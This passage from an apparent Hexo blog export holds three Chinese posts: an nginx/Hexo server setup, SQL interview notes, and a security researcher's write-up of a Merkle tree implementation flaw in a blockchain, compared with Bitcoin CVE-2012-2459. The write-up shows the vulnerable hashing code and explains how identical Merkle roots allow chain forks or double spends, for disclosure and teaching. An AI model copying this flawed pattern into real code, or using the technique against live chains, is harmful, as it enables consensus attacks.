rel=\"noopener\">https://hexo.io/zh-cn/</a></p>\n<p>安装非常简单，配一些基本的内容，装了些主题和插件就ok了。</p>\n<p>主题：Archer</p>\n","site":{"data":{}},"excerpt":"<p>“我搭了一个服务器，吼吼”</p>\n<p>在vultr租了3.5刀一个月的服务器，然后要把他折腾成 个人网站/博客+酸酸两用的服务器嗝，记录一下都做了哪些配置。</p>","more":"<blockquote>\n<p>这写文章的风格咋和一个大一小朋友一样哈哈</p>\n</blockquote>\n<h2 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h2><p>首先是购买域名，买了<a href=\"www.aississl.cn\">www.aisissel.cn</a> ，和自己公众号[AiSissel]一样耶，稍微规划一下二级域名</p>\n<ul>\n<li>blog.aisissel.cn 用来做博客</li>\n<li>[<em>.]</em>aisissel.cn 其他用来做个人主页</li>\n</ul>\n<p>然后酸酸开在高端口上，还要去签一个证书，<a href=\"https://console.cloud.tencent.com/ssl\" target=\"_blank\" rel=\"noopener\">腾讯云-申请证书</a> ，启动~</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_287a5e563f04f1883ca78fcd99c07eb7.png\" alt></p>\n<p>然后看看配一下nginx~</p>\n<p><img src=\"https://md.byr.moe/uploads/upload_0e947d7f43b85fab7c0b8d6ba4b7ff5c.png\" alt></p>\n<p>写一下配置哈哈</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl default_server;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> [::]:<span class=\"number\">443</span> ssl default_server;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> blog.aisissel.cn;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">ssl</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate</span> /xxxxx/blog.aisissel.cn.pem;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate_key</span> /xxxxx/blog.aisissel.cn.key;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_session_timeout</span> <span class=\"number\">5m</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_protocols</span> TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_ciphers</span> AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_prefer_server_ciphers</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">                <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:4000;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> [::]:<span class=\"number\">443</span> ssl;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> www.aisissel.cn aisissel.cn;</span><br><span class=\"line\">    <span class=\"attribute\">ssl</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">    <span class=\"comment\"># 这里这里，为什么我两个域名用了同一个证书呀？</span></span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate</span> /xxxxx/aisissel.cn.pem;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate_key</span> /xxxxx/aisissel.cn.key;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_session_timeout</span> <span class=\"number\">5m</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_protocols</span> TLSv1 TLSv1.<span class=\"number\">1</span> TLSv1.<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_ciphers</span> AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_prefer_server_ciphers</span> <span class=\"literal\">on</span>;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"attribute\">root</span> /var/www/html;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.html index.htm index.php;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">listen</span>       <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span>  aisissel.cn www.aisissel.cn blog.aisissel.cn;</span><br><span class=\"line\">    <span class=\"attribute\">rewrite</span><span class=\"regexp\"> ^(.*)</span> https://<span class=\"variable\">$host</span><span class=\"variable\">$1</span> <span class=\"literal\">permanent</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>有一个小问题，为什么我两个域名，用了同一个证书，还没问题呢？</p>\n<h2 id=\"再配hexo\"><a href=\"#再配hexo\" class=\"headerlink\" title=\"再配hexo\"></a>再配hexo</h2><p>hexo是一个基于nodejs的，支持md，非常好用的博客框架，总之就是非常厉害吼吼。</p>\n<p><a href=\"https://hexo.io/zh-cn/\" target=\"_blank\" rel=\"noopener\">https://hexo.io/zh-cn/</a></p>\n<p>安装非常简单，配一些基本的内容，装了些主题和插件就ok了。</p>\n<p>主题：Archer</p>"},{"title":"【SQL】SQL语句怎么写","date":"2019-03-28T18:17:40.000Z","_content":"\n持续更新，因为近期写了好多sql语句，所以来列个入门级的内容，掌握了这些再去多刷刷题就好啦\n\n<!-- more -->\n\n## 随便写写\n\n- 一般来说，我们写一个查询从两个方向考虑，一个是看输出的格式，比如直接输出成rows，或者要 create table，或者修改一些输出格式，比如行变列，列变行。\n- 这一层面一般是比较简单的，只要得到数据，都可以用 `select a.xxx as 输出列的名字, b.yyy as 输出列的名字` 来封装好，其他的输出无非是format一下\n    - `create table as/like`\n    - `group_concat()【行变列】`\n    - `case xx when xx then xx else xx end` \n- 之后就是拨开输出的层面，去看我们需要什么数据，在哪些库里。主要是查什么？\n    - 这几个商品 `Item`、`ID`\n- 一般都需要用到分组\n    - 每一天的最大值 `group by Date`\n    - 每个班级的前三名 `group by ClassID`\n- 排序\n    - 前三名 `order by score desc`\n- 表的连接，根据不同的情况，一般需要\n    - `outer join`\n    - `inner join`\n    - `select xx,xx from a, b where a.x=b.x`\n- 注意一些条件的写法\n    - `group by having`\n    - `where`\n    - `xxx join table_a on condition`\n- 其他\n    - 唯一性 `distinct`\n    - 升降序 `desc`、`asc\n    - top语句 【不一定支持】\n    - like、通配符\n    - limit\n    - count()\n    - 求和，平均值\n    - 最大最小值\n    - `isnull()`\n\n## 常见的题型\n\n- 分组后的top x【每个班的最高分】\n- 计数，有多少个`count()`\n- 连续几天签到\n- 简单的循环【变量】\n- 行列变换\n- 连接的种类，left join/right join/outer join等\n- null的处理\n- ...\n\n还补充点啥\n\n剩下的就是多写多搜了，mysql报错比起其他语言来说难调试很多。。\n\n## 除了select\n\n当然还有\n\n- 建table和view\n- 加索引\n- 加列、改列\n- update、insert\n- 不同的清空表的方法\n- 这就太多了。。自己搜面试题吧\n\n","source":"_posts/how-to-interview-for-mysql.md","raw":"---\ntitle: 【SQL】SQL语句怎么写\ndate: 2019-03-29 02:17:40\ntags:\n- 淘宝店\n- SQL\n- 面试\n---\n\n持续更新，因为近期写了好多sql语句，所以来列个入门级的内容，掌握了这些再去多刷刷题就好啦\n\n<!-- more -->\n\n## 随便写写\n\n- 一般来说，我们写一个查询从两个方向考虑，一个是看输出的格式，比如直接输出成rows，或者要 create table，或者修改一些输出格式，比如行变列，列变行。\n- 这一层面一般是比较简单的，只要得到数据，都可以用 `select a.xxx as 输出列的名字, b.yyy as 输出列的名字` 来封装好，其他的输出无非是format一下\n    - `create table as/like`\n    - `group_concat()【行变列】`\n    - `case xx when xx then xx else xx end` \n- 之后就是拨开输出的层面，去看我们需要什么数据，在哪些库里。主要是查什么？\n    - 这几个商品 `Item`、`ID`\n- 一般都需要用到分组\n    - 每一天的最大值 `group by Date`\n    - 每个班级的前三名 `group by ClassID`\n- 排序\n    - 前三名 `order by score desc`\n- 表的连接，根据不同的情况，一般需要\n    - `outer join`\n    - `inner join`\n    - `select xx,xx from a, b where a.x=b.x`\n- 注意一些条件的写法\n    - `group by having`\n    - `where`\n    - `xxx join table_a on condition`\n- 其他\n    - 唯一性 `distinct`\n    - 升降序 `desc`、`asc\n    - top语句 【不一定支持】\n    - like、通配符\n    - limit\n    - count()\n    - 求和，平均值\n    - 最大最小值\n    - `isnull()`\n\n## 常见的题型\n\n- 分组后的top x【每个班的最高分】\n- 计数，有多少个`count()`\n- 连续几天签到\n- 简单的循环【变量】\n- 行列变换\n- 连接的种类，left join/right join/outer join等\n- null的处理\n- ...\n\n还补充点啥\n\n剩下的就是多写多搜了，mysql报错比起其他语言来说难调试很多。。\n\n## 除了select\n\n当然还有\n\n- 建table和view\n- 加索引\n- 加列、改列\n- update、insert\n- 不同的清空表的方法\n- 这就太多了。。自己搜面试题吧\n\n","slug":"how-to-interview-for-mysql","published":1,"updated":"2020-02-19T12:03:22.030Z","_id":"ck6rlh7te000421vwte4d4y0h","comments":1,"layout":"post","photos":[],"link":"","content":"<p>持续更新，因为近期写了好多sql语句，所以来列个入门级的内容，掌握了这些再去多刷刷题就好啦</p>\n<a id=\"more\"></a>\n<h2 id=\"随便写写\"><a href=\"#随便写写\" class=\"headerlink\" title=\"随便写写\"></a>随便写写</h2><ul>\n<li>一般来说，我们写一个查询从两个方向考虑，一个是看输出的格式，比如直接输出成rows，或者要 create table，或者修改一些输出格式，比如行变列，列变行。</li>\n<li>这一层面一般是比较简单的，只要得到数据，都可以用 <code>select a.xxx as 输出列的名字, b.yyy as 输出列的名字</code> 来封装好，其他的输出无非是format一下<ul>\n<li><code>create table as/like</code></li>\n<li><code>group_concat()【行变列】</code></li>\n<li><code>case xx when xx then xx else xx end</code> </li>\n</ul>\n</li>\n<li>之后就是拨开输出的层面，去看我们需要什么数据，在哪些库里。主要是查什么？<ul>\n<li>这几个商品 <code>Item</code>、<code>ID</code></li>\n</ul>\n</li>\n<li>一般都需要用到分组<ul>\n<li>每一天的最大值 <code>group by Date</code></li>\n<li>每个班级的前三名 <code>group by ClassID</code></li>\n</ul>\n</li>\n<li>排序<ul>\n<li>前三名 <code>order by score desc</code></li>\n</ul>\n</li>\n<li>表的连接，根据不同的情况，一般需要<ul>\n<li><code>outer join</code></li>\n<li><code>inner join</code></li>\n<li><code>select xx,xx from a, b where a.x=b.x</code></li>\n</ul>\n</li>\n<li>注意一些条件的写法<ul>\n<li><code>group by having</code></li>\n<li><code>where</code></li>\n<li><code>xxx join table_a on condition</code></li>\n</ul>\n</li>\n<li>其他<ul>\n<li>唯一性 <code>distinct</code></li>\n<li>升降序 <code>desc</code>、`asc</li>\n<li>top语句 【不一定支持】</li>\n<li>like、通配符</li>\n<li>limit</li>\n<li>count()</li>\n<li>求和，平均值</li>\n<li>最大最小值</li>\n<li><code>isnull()</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"常见的题型\"><a href=\"#常见的题型\" class=\"headerlink\" title=\"常见的题型\"></a>常见的题型</h2><ul>\n<li>分组后的top x【每个班的最高分】</li>\n<li>计数，有多少个<code>count()</code></li>\n<li>连续几天签到</li>\n<li>简单的循环【变量】</li>\n<li>行列变换</li>\n<li>连接的种类，left join/right join/outer join等</li>\n<li>null的处理</li>\n<li>…</li>\n</ul>\n<p>还补充点啥</p>\n<p>剩下的就是多写多搜了，mysql报错比起其他语言来说难调试很多。。</p>\n<h2 id=\"除了select\"><a href=\"#除了select\" class=\"headerlink\" title=\"除了select\"></a>除了select</h2><p>当然还有</p>\n<ul>\n<li>建table和view</li>\n<li>加索引</li>\n<li>加列、改列</li>\n<li>update、insert</li>\n<li>不同的清空表的方法</li>\n<li>这就太多了。。自己搜面试题吧</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>持续更新，因为近期写了好多sql语句，所以来列个入门级的内容，掌握了这些再去多刷刷题就好啦</p>","more":"<h2 id=\"随便写写\"><a href=\"#随便写写\" class=\"headerlink\" title=\"随便写写\"></a>随便写写</h2><ul>\n<li>一般来说，我们写一个查询从两个方向考虑，一个是看输出的格式，比如直接输出成rows，或者要 create table，或者修改一些输出格式，比如行变列，列变行。</li>\n<li>这一层面一般是比较简单的，只要得到数据，都可以用 <code>select a.xxx as 输出列的名字, b.yyy as 输出列的名字</code> 来封装好，其他的输出无非是format一下<ul>\n<li><code>create table as/like</code></li>\n<li><code>group_concat()【行变列】</code></li>\n<li><code>case xx when xx then xx else xx end</code> </li>\n</ul>\n</li>\n<li>之后就是拨开输出的层面，去看我们需要什么数据，在哪些库里。主要是查什么？<ul>\n<li>这几个商品 <code>Item</code>、<code>ID</code></li>\n</ul>\n</li>\n<li>一般都需要用到分组<ul>\n<li>每一天的最大值 <code>group by Date</code></li>\n<li>每个班级的前三名 <code>group by ClassID</code></li>\n</ul>\n</li>\n<li>排序<ul>\n<li>前三名 <code>order by score desc</code></li>\n</ul>\n</li>\n<li>表的连接，根据不同的情况，一般需要<ul>\n<li><code>outer join</code></li>\n<li><code>inner join</code></li>\n<li><code>select xx,xx from a, b where a.x=b.x</code></li>\n</ul>\n</li>\n<li>注意一些条件的写法<ul>\n<li><code>group by having</code></li>\n<li><code>where</code></li>\n<li><code>xxx join table_a on condition</code></li>\n</ul>\n</li>\n<li>其他<ul>\n<li>唯一性 <code>distinct</code></li>\n<li>升降序 <code>desc</code>、`asc</li>\n<li>top语句 【不一定支持】</li>\n<li>like、通配符</li>\n<li>limit</li>\n<li>count()</li>\n<li>求和，平均值</li>\n<li>最大最小值</li>\n<li><code>isnull()</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"常见的题型\"><a href=\"#常见的题型\" class=\"headerlink\" title=\"常见的题型\"></a>常见的题型</h2><ul>\n<li>分组后的top x【每个班的最高分】</li>\n<li>计数，有多少个<code>count()</code></li>\n<li>连续几天签到</li>\n<li>简单的循环【变量】</li>\n<li>行列变换</li>\n<li>连接的种类，left join/right join/outer join等</li>\n<li>null的处理</li>\n<li>…</li>\n</ul>\n<p>还补充点啥</p>\n<p>剩下的就是多写多搜了，mysql报错比起其他语言来说难调试很多。。</p>\n<h2 id=\"除了select\"><a href=\"#除了select\" class=\"headerlink\" title=\"除了select\"></a>除了select</h2><p>当然还有</p>\n<ul>\n<li>建table和view</li>\n<li>加索引</li>\n<li>加列、改列</li>\n<li>update、insert</li>\n<li>不同的清空表的方法</li>\n<li>这就太多了。。自己搜面试题吧</li>\n</ul>"},{"title":"【安全研究】区块链公链审计过程中遇到的Merkle Tree底层实现问题 及 CVE-2012-2459分析","date":"2019-03-18T17:16:29.000Z","_content":"\n之前在职期间审计项目时发现的漏洞，关于公链项目在审计底层merkle tree实现时产生的漏洞。对内容进行了一定的处理，不能介绍完整的攻击链。欢迎大佬们提提意见，看看思路如何。\n\n<!-- more -->\n\n> 长亭科技@区块链方向安全研究员 Sissel\n\n## 前言\n\n> 区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。\n> 这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。\n\n在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。在此前一项公链审计的项目过程中，我们发现了一个有意思的关于Merkle Tree底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。\n\n## 公链项目审计\n\n回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS公链上层出不穷的合约问题。使用搜索引擎搜索，搜索和区块链相关的审计类文章，也大多为智能合约的check list、智能合约的审计分析等。针对公链审计类的技术分享并无很多。这里推荐大家一份**长亭科技**的[《区块链安全生存指南》](https://www.chaitin.cn/zh/reports)，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。\n\n审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的0day或1day漏洞，结合业务场景，分析代码的实现。区块链公链项目，其本身代码量较多，且无较为实用的审计工具。并且在项目背后，还有严谨的金融货币模型以及共识模型。依我理解，我们主要从以下方向入手：\n\n- 语言特性及其已知漏洞\n- 底层实现【密码学、序列化、大数运算等】\n- 区块链基本元素的实现【区块、交易、链】\n- 区块链行为的逻辑【生成一个区块、交易进入tx_pool等】\n- 区块链的其他组件【p2p、rpc、钱包等】\n- 共识算法合理性\n- 金融模型合理性\n- 历史公链漏洞\n- 【待chief补充2333】\n\n## 漏洞发现过程\n\n我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现Merkle Tree逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。\n\n> 在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。\n\n### 什么是Merkle Tree\n\nMerkle Tree，一般也称为Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含Hash值。Merkle Tree具有以下的特点。\n\n1. 它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】\n2. Merkle Tree的叶子节点中存放数据。非叶子节点的value，是由其左右两子节点，经过组合和Hash运算获得。\n\n让我们举个例子来表示：\n\n![](https://md.byr.moe/uploads/upload_1c34db3aeb4504d7966eae58bdbf7cd9.png)\n\n我们可以看到，只有叶子节点中存放了Data【Tx Hash】，而其上面每一个非叶子节点的value，都是他们孩子的value，经过组合和哈希运算得到的。\n\nMerkle Tree被广泛应用于对比以及验证处理。在区块链技术中，Merkle Tree被用于验证各区块中的交易，在传输过程中是否被篡改，因为我们可以看到，倘若修改任一叶子节点的内容，这棵Merkle Tree的root节点的值【Merkle根】就会随之改变，可以通过判断Merkle根来得知，该区块中，有交易可能传输出错或被恶意篡改。\n\n![](https://md.byr.moe/uploads/upload_1e99b3f060d1dec2406c40d8b7a6a2fa.png)\n\n### 审计中发现的实现方式\n\n核心代码【有修改】：\n```python\n# 外层为循环，以建立Merkle Tree\nif hashList[i+1] == None :\n    hashList[p] = sha3(hashList[i]+hashList[i])\nelse :\n    if hashList[i] > hashList[i+1] :\n        hashList[p] = sha3(hashList[i]+hashList[i+1])\n    else:\n        hashList[p] = sha3(hashList[i+1]+hashList[i])\n\n```\n\n在审计过程中，当考察到Merkle Tree底层实现方式时，发现其实现有一定违和感，具体如下：\n\n1. 先根据tx_hash数量，建立一棵完全二叉树\n2. 将tx_hash，按顺序放至叶子节点中\n3. 通过以下算法算得上层节点的Hash值：\n    1. 对于某一非叶子节点，将其两孩子的value进行比较，**序列大者靠前**\n    2. 将排好的两孩子，进行Hash运算，得到的Hash值为该节点的value\n4. 如此往复，建立Merkle Tree，算得根节点的value\n\n举例说明：\n\n![](https://md.byr.moe/uploads/upload_e752f85f40b5d33a71e117dacf7b5a3b.png)\n\n初看此处时，觉得实现Merkle Tree的方式有些奇怪，进行了一次两孩子的value比较，但想到Merkle Tree的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。\n\n### Bitcoin漏洞 CVE-2012-2459\n\n在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币DoS漏洞。\n\n![](https://md.byr.moe/uploads/upload_caa4a265690ed28ad7ef5363a5c88dd5.png)\n\n通过了Merkle Root的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。\n\n在旧版本的Bitcoin客户端中，其实现Merkle Tree的建立【计算该区块交易的Merkle根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：\n\n![](https://md.byr.moe/uploads/upload_1e3d765f52afa92e9ea4cc794a26d75a.png)\n\n在计算Merkle根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的Hash值，参与建立Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。\n\n看上去没有什么太大的问题，只是计算Merkle根时，对边界的处理。但CVE-2012-2459漏洞，利用的就是这一个特性。\n\n#### 区块A：\n\n| tx_id | hash |\n| -------- | -------- |\n| 0     | 3d5c     |\n| 1     | e8aa     |\n| 2     | 7e7f     |\n\n攻击者首先选择,一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。\n\n#### 区块B:\n\n| tx_id | hash | 备注 | \n| -------- | -------- | ----- |\n| 0     | 3d5c     | \n| 1     | e8aa     |\n| 2     | 7e7f     | \n| 3     | 7e7f     | 重复的交易|\n\n![](https://md.byr.moe/uploads/upload_75d01621f5de14d5b3bf61a8f827159a.png)\n\n\n区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为tx_3和tx_2一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的Merkle根是一致的。对应的区块头也是一致的。\n\n攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。\n\n### 漏洞利用方式\n\n回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。\n\n我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变Merkle 根的值。\n\n经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。\n\n## 总结\n\n> 汇报该漏洞后，公链开发者十分重视这一问题，响应迅速，立刻修复了该实现问题。\n\n在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： **代码千万行，安全第一行。实现不规范，首席两行泪。** 对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。\n\n---\n\n**长亭科技区块链安全组**，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的CVE编号漏洞，曾进行过大量的公链审计、智能合约审计，提供许多企业级服务，并曾对优秀的公链社区提供了许多建设性意见。\n\n","source":"_posts/merkle-tree-vulnerability.md","raw":"---\ntitle: 【安全研究】区块链公链审计过程中遇到的Merkle Tree底层实现问题 及 CVE-2012-2459分析\ndate: 2019-03-19 01:16:29\ntags:\n- 区块链\n- go\n- 代码审计\n---\n\n之前在职期间审计项目时发现的漏洞，关于公链项目在审计底层merkle tree实现时产生的漏洞。对内容进行了一定的处理，不能介绍完整的攻击链。欢迎大佬们提提意见，看看思路如何。\n\n<!-- more -->\n\n> 长亭科技@区块链方向安全研究员 Sissel\n\n## 前言\n\n> 区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。\n> 这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。\n\n在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。在此前一项公链审计的项目过程中，我们发现了一个有意思的关于Merkle Tree底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。\n\n## 公链项目审计\n\n回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS公链上层出不穷的合约问题。使用搜索引擎搜索，搜索和区块链相关的审计类文章，也大多为智能合约的check list、智能合约的审计分析等。针对公链审计类的技术分享并无很多。这里推荐大家一份**长亭科技**的[《区块链安全生存指南》](https://www.chaitin.cn/zh/reports)，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。\n\n审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的0day或1day漏洞，结合业务场景，分析代码的实现。区块链公链项目，其本身代码量较多，且无较为实用的审计工具。并且在项目背后，还有严谨的金融货币模型以及共识模型。依我理解，我们主要从以下方向入手：\n\n- 语言特性及其已知漏洞\n- 底层实现【密码学、序列化、大数运算等】\n- 区块链基本元素的实现【区块、交易、链】\n- 区块链行为的逻辑【生成一个区块、交易进入tx_pool等】\n- 区块链的其他组件【p2p、rpc、钱包等】\n- 共识算法合理性\n- 金融模型合理性\n- 历史公链漏洞\n- 【待chief补充2333】\n\n## 漏洞发现过程\n\n我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现Merkle Tree逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。\n\n> 在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。\n\n### 什么是Merkle Tree\n\nMerkle Tree，一般也称为Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含Hash值。Merkle Tree具有以下的特点。\n\n1. 它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】\n2. Merkle Tree的叶子节点中存放数据。非叶子节点的value，是由其左右两子节点，经过组合和Hash运算获得。\n\n让我们举个例子来表示：\n\n![](https://md.byr.moe/uploads/upload_1c34db3aeb4504d7966eae58bdbf7cd9.png)\n\n我们可以看到，只有叶子节点中存放了Data【Tx Hash】，而其上面每一个非叶子节点的value，都是他们孩子的value，经过组合和哈希运算得到的。\n\nMerkle Tree被广泛应用于对比以及验证处理。在区块链技术中，Merkle Tree被用于验证各区块中的交易，在传输过程中是否被篡改，因为我们可以看到，倘若修改任一叶子节点的内容，这棵Merkle Tree的root节点的值【Merkle根】就会随之改变，可以通过判断Merkle根来得知，该区块中，有交易可能传输出错或被恶意篡改。\n\n![](https://md.byr.moe/uploads/upload_1e99b3f060d1dec2406c40d8b7a6a2fa.png)\n\n### 审计中发现的实现方式\n\n核心代码【有修改】：\n```python\n# 外层为循环，以建立Merkle Tree\nif hashList[i+1] == None :\n    hashList[p] = sha3(hashList[i]+hashList[i])\nelse :\n    if hashList[i] > hashList[i+1] :\n        hashList[p] = sha3(hashList[i]+hashList[i+1])\n    else:\n        hashList[p] = sha3(hashList[i+1]+hashList[i])\n\n```\n\n在审计过程中，当考察到Merkle Tree底层实现方式时，发现其实现有一定违和感，具体如下：\n\n1. 先根据tx_hash数量，建立一棵完全二叉树\n2. 将tx_hash，按顺序放至叶子节点中\n3. 通过以下算法算得上层节点的Hash值：\n    1. 对于某一非叶子节点，将其两孩子的value进行比较，**序列大者靠前**\n    2. 将排好的两孩子，进行Hash运算，得到的Hash值为该节点的value\n4. 如此往复，建立Merkle Tree，算得根节点的value\n\n举例说明：\n\n![](https://md.byr.moe/uploads/upload_e752f85f40b5d33a71e117dacf7b5a3b.png)\n\n初看此处时，觉得实现Merkle Tree的方式有些奇怪，进行了一次两孩子的value比较，但想到Merkle Tree的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。\n\n### Bitcoin漏洞 CVE-2012-2459\n\n在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币DoS漏洞。\n\n![](https://md.byr.moe/uploads/upload_caa4a265690ed28ad7ef5363a5c88dd5.png)\n\n通过了Merkle Root的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。\n\n在旧版本的Bitcoin客户端中，其实现Merkle 